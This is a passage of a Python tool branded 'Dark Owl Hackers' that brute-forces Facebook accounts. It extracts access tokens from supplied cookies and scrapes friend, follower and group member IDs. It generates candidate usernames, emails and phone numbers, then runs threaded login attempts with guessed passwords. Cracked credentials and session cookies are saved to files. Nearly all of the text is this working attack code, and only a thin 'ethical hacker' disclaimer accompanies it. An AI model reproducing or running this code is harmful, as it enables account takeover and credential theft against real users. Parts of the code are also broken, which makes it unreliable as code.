					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Success!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print("\x1b[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
							print(f"\x1b[1;97m[\x1b[1;92m*\x1b[1;97m] Token :\x1b[1;92m {access_token}")
							print("\x1b[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("{white}login successfully saved in .token.txt && .cok.txt");exit()
			except Exception as e:
				print(" Cookies Invalid bro")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
	        
#------------------[ MAIN-MENU ]----------------#
def menu(NAME,ID):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Expired ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	logo()
	print('')
	print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print('\x1b[1;97m[1] MULTI BRUTEFORCE VECTOR ')
	print('\x1b[1;97m[2] SINGLE BRUTE FORCE VECTOR \033[1;97mv1') 
	print('\x1b[1;97m[3] SINGLE BRUTE FORCE VECTOR WITH PASSWORD LIST')
	print('\x1b[1;97m[4] GROUP BRUTEFORCE VECTOR  ')
	print('\x1b[1;97m[5] FOLLOWERS BRUTEFORCE VECTOR')
	print('\x1b[1;97m[6] NUMBER BRUTEFORCE VECTOR ')
	print('\x1b[1;97m[7] EXTRACT IDS FROM ANY PROFILE  ')
	print('\x1b[1;97m[8] BRUTEFORCE FILE VECTOR')
	print('\x1b[1;97m[9] AUTO SHARE BOT VECTOR ')
	print('\x1b[1;97m[10] CHECK BRUTEFORCED RESULTS ')
	print('\x1b[1;97m[11] EMAIL BRUTEFORCE VECTOR ')
	print('\x1b[1;97m[12] USERNAME BRUTEFORCE VECTOR ')
	print('\x1b[1;97m[13] GET FACEBOOK HEADERS')
	print('\x1b[1;97m[14] CHECK IP CONDITION ')
	print('\x1b[1;97m[15] GET FREE LOGIN CSFR')
	print('\x1b[1;97m[16] JOIN FACEBOOK PAGE ')
	print('\x1b[1;97m[17] JOIN FB GROUP ')
	print('\x1b[1;97m[18] JOIN WHATSAPP GROUP FOR UPDATES')
	print('\x1b[1;97m[19] ABOUT THIS TOOL ')
	print('\x1b[1;97m[20] VISIT OUR WEBSITE ')
	print('\x1b[1;97m[21] CONTACT ADMIN ')
	print('\x1b[1;97m[00]\003[1;91m REMOVE CSFR_ LOGIN ')
	print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	DARK = input('\x1b[1;32mCHOOSE : ')
	if DARK in ['1','01']:multi()
	elif DARK in ['2','02']:clone2()
	elif DARK in ['3','03']:gbf()
	elif DARK in ['4','04']:group()
	elif DARK in ['5','05']:clone()
	elif DARK in ['6','06']:numb()
	elif DARK in ['7','07']:dump()
	elif DARK in ['08','8']:file()
	elif DARK in ['09','09']:autoshare()
	elif DARK in ['111','10']:results()
	elif DARK in ['x','11']:email()
	elif DARK in ['.','12']:usern()
	elif DARK in ['+','13']:fbhead()
	elif DARK in ['+','14']:ip()
	elif DARK in ['_&','15']:freelog()
	elif DARK in [':::','16']:fbpg()
	elif DARK in ['+-','17']:fbgp()
	elif DARK in ['4','18']:wp()
	elif DARK in ['---','19']:ab()
	elif DARK in ['&&','20']:web()
	elif DARK in ['///','21']:contad()
	
	elif DARK in ['0','00']:
		os.system('rm -rf .token.txt & rm -rf .cookie.txt')
		print(' cookie Logged out+cookie deleted ')
		exit()
	else:
		print(' invalid Opti on ')
		back()
def error():
	print(f' LATER')
	time.sleep(4)
	back()


####---------[DUMP MULTI ID]--------###$#
def MULTIIDDUMPERGRAPH():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		logo()
		jum = int(input(f'\x1b[1;32m[-] HOW MANY IDS DO YOU WANT ADD? :'))
		print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	except ValueError:
		print('Enter the number of the dump idz, instead of the letter  ')
		exit()
	if jum<1 or jum>100:
		print('• Failed to Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{h} INPUT ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('Signs of errors, lolz ')
			exit()
	try:
	    
	
		print(f'✓]{x}TOTAL ID : {h}{x}'+str(len(id)))
		print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('[×]Your signal is FUcKeD ')
		back()
	except (KeyError,IOError):
		print(f'[×]{k} Unlisted Friends {x}')
		time.sleep(3)
		back()
	
	
#####_______[GROUP CRACKER]_____######
#-----------------[ CRACK GRUP ]-----------------# 
def group():
	print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print("[+] PLS NOTE [==] GROUP ID MUST BE PUBLIC")
	link = input(f'[+] ENTER GROUP ID : ')
	url = 'https://mbasic.facebook.com/'+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [+] SORRY THE GROUP IS PRIVATE')
	setting()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r [+] DUMPING {len(id)} Idz...');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://m.facebook.com"+href)
	except:dump_grup(url)
	
def clone():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(f"\033[1;32m TARGET ACCOUNT INFORMATION MUST BE VALID")
	akun = console.input(f'[+] ENTER TARGET ID : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"[+] DUMPING {len(id)} IDs...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"TOTAL {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] INTERNET NOT STABLE")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f"[+] the account info is not disposable")
		time.sleep(3);exit()
#-----[DUMP2]------#
def clone2():
	os.system('clear')
	logo()
	try:
		tokenku=[]
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('COOKIES EXPIRED')
		exit()
	print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	mic = input(f'\033[1;32m[=][ENTER TARGET ID] : ')
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+proses+'?fields=friends.limit(5001)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		print(f'[+] TOTAL ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'INTERNET CONNECTION PROBLEM')
		exit()
	except (KeyError,IOError):
		print(f'\033[1;91m ID NOT PUBLIC ')
		exit()
		
#---------[USERNAME CLONE]-----------#
def usern():
    user=[]
    os.system('clear')
    logo()
    
    kode = input('\033[1;32m[~] ENTER TARGET FIRST NAME : ')
    kodex = input('\033[1;32m[~]ENTER TARGET LAST NAME :  ')
    doamin = '.'
    limit = int(input('[?]\033[1;32m ENTER CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        logo()
        tl = str(len(user))
        print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print('[~] TOTAL IDS:\033[1;92m '+tl)
        print(f"\033[1;97m [~] FACEBOOK USERNAME CLONER")
        print('\033[1;97m[~] THE PROCESS IN PROCESS') 
        print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print(50*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(crack0,uid,pwx,tl)
    print(50*'_')
    print(' [~¶] CRACK PROCESS HAS BEEN COMPLETED')
    print(' [~¶] Ids Saved In Ok.txt,cp.txt')
    print(50*'_')
    
def crack0(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            pro= random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
    'method':'POST',
    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
    'scheme':'https',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'x-asbd-id': '198387',
    'x-fb-lsd': 'AVoPmsopEAk',
    'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;97m[DARK-OWL-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[][COOKIE]= \033[1;32m'+coki+ '')
                
                open('/sdcard/DARK OWL-OK.txt', 'a').write( cid+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[DARK-OWL-CP][¡]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/DARK-OWL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mDARK OWL\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

def gmail():
    user=[]
    os.system('clear')
    logo()
    
    kode = input('[?] ENTER TARGET FAST NAME : ')
    os.system('clear')
    logo()
    de ("espeak \" Target last name \"")
    kodex = input('[?] ENTER TARGET LAST NAME :  ')
    os.system('clear')
    logo()
    print(' [+] EXAMPLE : @GMAIL.COM, @YAHOO.COM ')
    print("\033[1;32m---------------------------------------------------")
    doamin = input('[?] Terget DOMAIN : ')
    os.system('clear')
    logo()
    print('[+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m1;32m---------------------------------------------------")
    limit = int(input('[?] CRACK LIMIT ? : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        logo()
        tl = str(len(user))
        print('\033[1;91m[+] TOTAL USERAGENT \1;92m 300 ')
        print('\033[1;93m[+] TOOL READY TO BRUTEFORCE ')
        print('\033[1;97m[+] Total ids:\033[1;92m '+tl)
        print('\033[1;97m[+] PROCESS HAS BEEN STARTED')
        print('\033[1;97m[!] PLEASE WAIT... ')
        print('\033[1;92m[!] USE FLIGHT MODE FOR SPEED UP ')
        print("\033[1;32m---------------------------------------------------")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kodex+'123456',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kodex+'123456']
            yaari.submit(crack1,uid,pwx,tl)
    
    
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
    print('==================================')
    
def crack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            pro = random.choice(ugen2)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;94mDARK-OWL\033[1;97m] [] [%s/%s] [] [OK\033[1;97m:-\033[1;92m%s\033[1;97m] [] [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[DARKEST OWL] {uid} | {ps}")
                print(f"[ACTIVE] [COOKIES] | {coki}")
                cek_apk(session,coki)
                open('/sdcard/ok.txt', 'a').write( uid+'|'+ps+'|'+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[CP=SORRY- BRO] {cid}|{ps}")
                open('/sdcard/cp.txt', 'a').write( uid+'|'+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SSN | OK] \033[1;92m%s\033[m|\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass

###-------------[NUMBER]------------##$
def numb():
    user=[]
    os.system('clear')   
    logo()
    print('')
    print(' [+] EXAMPLE : +23481, +23480, +1616, ETC... ')
    print("\033[1;32m---------------------------------------------------")
    kode = input(' [?] ENTER CODE ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    logo()
    de ("espeak \"example 3000   5000 ! 10000  50000 \"")
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m---------------------------------------------------")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        logo()
        tl = str(len(user))
        print('\033[1;91m[=] TOTAL USERAGENT \033[1;32m306 ')
        print('\033[1;93m[=] TOOL READY TO BRUTEFORCE ')
        print('\033[1;97m[=] TOTAL IDS:\033[1;92m '+tl)
        print('\033[1;97m[=] PROCESS HAS BEEN STARTED')
        print('\033[1;92m[=] WAIT FOR IDS âˆš ')
        print('\033[1;94m[=] PLEASE DONT USE AIRPLANE MODE  ')
        print("\033[1;32m---------------------------------------------------")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(crack1,uid,pwx,tl)
    

def ip(): 
      os.system('clear')
      logo()
      print('checking for your ip condition.....')
      os.system('clear')
      logo()
      time.sleep(3)
      print('please wait......')
      time.sleep(2)
      print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      time.sleep(1)
      print('[IP ADDRESS]   : {ip}')
      time.sleep(3)
      print('checking for condition....')     
      print('IF NO RESULT USE FLIGHT MODE AND TURN IT ON BACK')
      time.sleep(4)
      print('sorry ...ip ')
      os.system('clear')
      logo()
      print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      print('TOTAL IP INFORMATION...')
      time.sleep(0.1)
      print('Still active | ...')
      time.sleep(1)
      print('changed | -')
      time.sleep(2)
      print('spammed | -')
      time.sleep(2)
      print('traced | -')
      time.sleep(3)
      print('status | still active')
      time.sleep(3)
      print('condition ')
      time.sleep(2)
      print('pls wait.....')
      time.sleep(5)
      print(' \033[1;32m CONGRATULATIONS YOUR {ip} IS VERY GOOD')
      exit()
      
#-----------------[ CHECK RESULT-CRACK ]-----------------#
def result():
	os.system('clear')
	logo()
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print('\x1b[1;32m[01] CP ACCOUNT ')
	print('\x1b[1;32m[02] OK ACCOUNT')
	print('\x1b[1;32m[00] EXIT	')
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	kz = input('\n CHOOSE : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n   CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' CHOOSE RIGHT OPTION ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="yellow")
				nocp +=1
			input('[ Click Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' No OK FILE HERE ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' SELECT RIGHT OPTION ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('[ CLICK ENTER 2 BACK ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('SELECT RIGHT OPTION ')
		exit()
		
def AB():
                                        
                                        os.system('clear')
                                        logo()
                                        print(' \033[32;41mDARKIEST 🦉 OWL HACKERS PRESENT FACEBOOK MULTI BRUTEFORCE TOOL \033[1;37m ')
                                        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                        print('\033[1;32mWELCOME TO FACEBOOK MULTI BRUTEFORCE TOOL')
                                        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                        print('\033[1;91m NOTE: WE WONT BE RESPONSIBLE FOR YOUR MISUSAGE')
                                        print()
                                        print('\033[1;91m THE TOOL IS FOR ETHICAL HACKERS LOOKING FOR TOOLS TO WORK WITH')
                                        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                        print('\033[1;95mUSE THIS TOOL WISELY [DARKEST OWL HACKERS] WE DO NOT HARM /n [+] WE ARE AGAINST THE SYSTEM [-] NOTE US')
                                        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                        
                                        
                                        exit()       

def file():
	os.system('clear')
	logo()
	#ckx()
	print(f"[1] START FILE CONING")
	print(f"[0] EXIT")
	me=input(f'CHOOS : ')
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' PUT FILE PATH\033[1;37m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' File location not found ')
			exit()
		print(f'\033[1;32m [1] Method 1 [USE]\n [2] Method 2 [NORMAL]\n [3] Method 3 [BEST]\n ')
		mthd=input(f' CHOOSE: ')
		plist=[]
		try:
			
			ps_limit = int(input(f' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
		except:
			ps_limit =1
		print(f'\033[1;32m [EXAMPLE] : first last,firtslast,first123,first@123')
		for i in range(ps_limit):
			plist.append(input(f'[ENTER PASSWORD] {i+1}: '))
		print(f' Do you want to show cp account? (y/n): ')
		cx=input(f' CHOOSE: ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' \n \033[1;37mMETHOD > \033[1;37mM{mthd}')
			print(f"\033[1;32m Use Flight Mode For Speed Up\033[1;37m")
			print(f'\x1b[1;32m--------------------------------------')
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(api,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(ffb1,ids,names,passlist)
					          
#-------------[ METHOD FOR-IDZ ]---------------#
def setting():
	os.system('clear')
	logo()
	print('')
	
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(f'\x1b[1;32m[+] TOTAL IDs :\x1b[1;35m {h}{x}'+str(len(id)))
	print('\x1b[1;32m[1] OLD ACCOUNT ')
	print('\x1b[1;32m[2] NEW ACCOUNT ')
	print('\x1b[1;32m[3] RANDOM ACCOUNT ')
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print('')
	hu = input('\x1b[1;32mCHOOSE METHOD [?] : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('SELLECT CORRECT OPTION')
		exit()
	os.system('clear')
	logo()
	print('')
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print('\x1b[1;32m[1] MOBILE')
	print('\x1b[1;35m[2] M-BETA ')
	print('\x1b[1;91m[3] ALPHA ')
	print('\x1b[1;32m[4] M-BASIC')
	print('\x1b[1;32m[5] B-API [FAST]')
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print('')
	hc = input('CHOOSE[?] : ')
	if hc in ['1','01']:
		method.append('crack')
	elif hc in ['2','02']:
		method.append('beta')
	elif hc in ['3','03']:
		method.append('mobile')
	elif hc in ['4','04']:
		method.append('mbasic')
	elif hc in ['05','5']:
		method.append('asy')
	else:
		method.append('crack')
	su()
def su():
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
